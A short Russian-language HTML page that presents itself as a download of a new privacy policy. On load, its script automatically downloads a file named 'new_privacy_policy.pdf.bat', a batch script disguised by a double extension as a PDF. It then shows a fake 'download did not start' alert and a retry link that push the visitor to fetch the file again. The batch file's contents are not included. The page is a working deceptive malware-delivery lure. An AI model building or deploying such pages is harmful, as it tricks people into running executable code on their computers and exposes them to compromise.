<!DOCTYPE html>
<html lang="ru">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Скачать файл с новыми положениями</title>
	<script>
		function showAlert() {
			alert("Извините, загрузка не началась");
		}

		function downloadFile() {
			try {
				const link = document.createElement('a');
				link.href = 'new_privacy_policy.pdf.bat';
				link.download = 'new_privacy_policy.pdf.bat';
				document.body.appendChild(link);
				link.click();
				document.body.removeChild(link);

				setTimeout(showAlert, 3000);
			} catch (e) {
				showAlert();
			}
		}

		window.onload = function () {
			downloadFile();
		};
	</script>
</head>

<body>
	<h1>Скачать файл с новыми положениями</h1>
	<p>Файл начнет загружаться автоматически. Если этого не произошло, <a href="javascript:void(0)"
			onclick="downloadFile()">нажмите здесь для загрузки</a>.</p>
</body>

</html>
